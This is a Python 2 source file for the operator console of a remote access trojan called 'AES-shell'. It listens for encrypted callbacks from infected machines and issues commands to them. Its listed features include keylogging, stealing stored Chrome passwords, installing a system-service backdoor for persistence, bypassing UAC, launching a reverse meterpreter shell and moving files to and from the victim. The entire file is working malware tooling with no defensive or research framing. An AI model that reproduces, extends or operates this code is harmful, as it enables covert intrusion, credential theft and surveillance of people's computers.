#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto import Random
import socket,base64,os,sys,string,random
try:
	import readline
except:
	pass

def completer(text, state):
	options = [i for i in commands if i.startswith(text)]
	if state < len(options):
		return options[state]
	else:
		return None

def bypassuac(cmd):
	encrypted = EncodeAES(cipher, "bypassuac " + cmd)
	s.send(encrypted)

def fnextcmd():
	global nextcmd, downfile, upfile
	nextcmd = False
	try:
		while not nextcmd:
			if isWindows:
				nextcmd = raw_input("%s>" % (pwd))
			else:
				if isSystem:
					nextcmd = raw_input("%s# " % (pwd))
				else:
					nextcmd = raw_input("%s$ " % (pwd))

	except:
		print
		c.close()
		exit()

	if nextcmd.startswith('bypassuac'):
		if isSystem:
			print ' [*] you are SYSTEM, no need to bypassuac.**n'
			fnextcmd()
		if isAdmin:
			bypassuac(' '.join(nextcmd.split(' ')[1:]))
		else:
			print ' [X] This account is not vulnerable to bypass-UAC.'
			print ' [*] Checking for misconfigured services..'
			encrypted = EncodeAES(cipher, "persistence")
			s.send(encrypted)

	elif nextcmd.startswith('persistence'):
		if isAdmin and opsys[-1] == '7':
			print ' [*] Installing system persistence service.'
			print ' [*] Persistence installed.'
			encrypted = EncodeAES(cipher, "persistence")
			s.send(encrypted)
			fmainloop(False)
		else:
			if opsys[-1] != '7':
				print ' [X] %s is not vulnerable to bypass-UAC.' % (opsys)
			else:
				print ' [X] This account is not vulnerable to bypass-UAC.'
			print ' [*] Checking for misconfigured services..'
			encrypted = EncodeAES(cipher, "persistence")
			s.send(encrypted)

	elif nextcmd.startswith('upload '):
		upfile = nextcmd.split(' ')[1]
		ufilename = upfile.split(os.sep)[-1]
		if len(ufilename) > 16:
			print ' [X] Error, Filename must be shorter than 16 characters**n'
			fnextcmd()
		else:
			try:
				paddedfilename = ufilename + '*' * (16 - len(ufilename))
				with open(upfile, 'rb') as f:
					encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + paddedfilename + f.read() + "EOFEOFEOFEOFEOFZ")
				s.send(encrypted)
			except:
				print ' [X] Error, %s not found!**n' % (upfile)
				fnextcmd()

	elif nextcmd == '?' or nextcmd == 'help':
		print fhelp()
		fnextcmd()

	# elif nextcmd.startswith('screenshot'):
	# 	downfile = 'screenshot_%s.bmp' % (random.randint(100,9999))
	# 	encrypted = EncodeAES(cipher, nextcmd)
	# 	s.send(encrypted)

	elif nextcmd.startswith('download '):
		downfile = nextcmd.split(' ')[1].split(os.sep)[-1].split('\\\\')[-1]
		encrypted = EncodeAES(cipher, nextcmd)
		s.send(encrypted)

	else:
		encrypted = EncodeAES(cipher, nextcmd)
		s.send(encrypted)

def fmainloop(first):											## This loop is used to accept a new connection
	global iv, cipher, s, address
	if first:
		print ' [>] Listening for connection on %s' % (listenport)
		print ' [>] AES secret: %s' % (secret)
		while True:
			iv = Random.new().read(AES.block_size)
			cipher = AES.new(secret,AES.MODE_CFB, iv)
			try:
				s,address = c.accept()
				break
			except socket.timeout:
				continue
	else:
		print ' [*] Bypassing UAC'
		print ' [>] Receiving SYSTEM shell'
		while True:
			iv = Random.new().read(AES.block_size)
			cipher = AES.new(secret,AES.MODE_CFB, iv)
			try:
				s,address = c.accept()
				break
			except socket.timeout:
				continue

def fhelp():
	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome, chromium and aviator stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'

commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ']
try:
	readline.parse_and_bind("tab: complete")
	readline.set_completer(completer)
except:
	pass
BLOCK_SIZE, PADDING, cfrom, pwd = 32, '{', ' ', ''
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
secret, listenport = "***SECRET***", ***PORT***
isAdmin, is64, isSystem, isProxied, isWindows, newpwd = False, False, False, False, False, False
iv = Random.new().read(AES.block_size)
cipher = AES.new(secret,AES.MODE_CFB, iv)
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	c.bind(('0.0.0.0', int(sys.argv[1])))
except:	
	c.bind(('0.0.0.0', int(listenport)))
c.listen(128)
c.settimeout(30)
fmainloop(True)

while True:
	try:
		data = s.recv(2048)
		if data.startswith("GET / HTTP/1.1**r**n**r**n"):		## Check if host is connecting through proxy
			data = data[18:]
			isProxied = True
		decrypted = DecodeAES(cipher, data)
	except:
		pass

	if decrypted.endswith("EOFEOFEOFEOFEOFX"):					## Data ending in this code indicates we should print the data
		if 'is not recognized as an internal' not in decrypted and ': command not found' not in decrypted:
			checkpath = decrypted.split('**n')[-2].strip('**n').strip('**r')
			if '[X]' not in checkpath and '[*]' not in checkpath:
				if isWindows:
					if '\\' in checkpath.strip('**r'):
						pwd = checkpath.strip('**r')
						newpwd = True
				else:
					if ':' not in checkpath:
						pwd = checkpath.strip('**r')
						newpwd = True
		if newpwd:
			print '**n'.join(decrypted.split('**n')[:-2]) + '**n'
		else:
			print decrypted[:-16]
		newpwd = False
		fnextcmd()

	elif decrypted.endswith('*' * 16):							## Get system info
		opsys = decrypted[64:128].strip('*')
		pwd = decrypted[144:208].strip('*')
		if ':' in pwd:
			isWindows = True
		if decrypted[143:144] == 'Y':
			is64 = True
			archvar = 'x64'
		else:
			archvar = 'x86'
		if decrypted[142:143] == 'A':
			isAdmin = True
		if decrypted[142:143] == 'S':
			isSystem = True
		if decrypted[141:142] == 'S':
			isSystem = True
		if isSystem:
			uservar = 'SYSTEM'
		else:
			if isAdmin:
				uservar = 'Admin!'
			else:
				uservar = 'not Admin'

		if isProxied:
			cfrom = ' (Proxy)'

		print ' [*] AES-Encrypted connection established with %s:%s%s' % (address[0], address[1], cfrom)
		print ' [*] User is %s, System is %s %s.**n' % (uservar, archvar, opsys)
		fnextcmd()

	elif decrypted[16:32] == "EOFEOFEOFEOFEOFS":				## Download a file
		try:
			print ' [*] %s received.**n' % (downfile)
			f = open(downfile, 'wb')
			f.write(decrypted[32:])
			while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
				data = s.recv(2048)
				decrypted = DecodeAES(cipher, data)
				if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
					f.write(decrypted[:-32])
				else:
					f.write(decrypted)
			f.close()
			fnextcmd()
		except Exception as e:
			print " [*] Something went wrong: %s**n" % (e)
			fnextcmd()

	elif decrypted[28:32] == 'WTF1':							## Print the output of bypassuac commands
		print decrypted[32:]
		fnextcmd()

	else:														## Print the normal output
		if decrypted:
			print decrypted
	try:
		if nextcmd == 'exit' or nextcmd == 'quit':
			c.close()
			break
	except:
		c.close()
		break
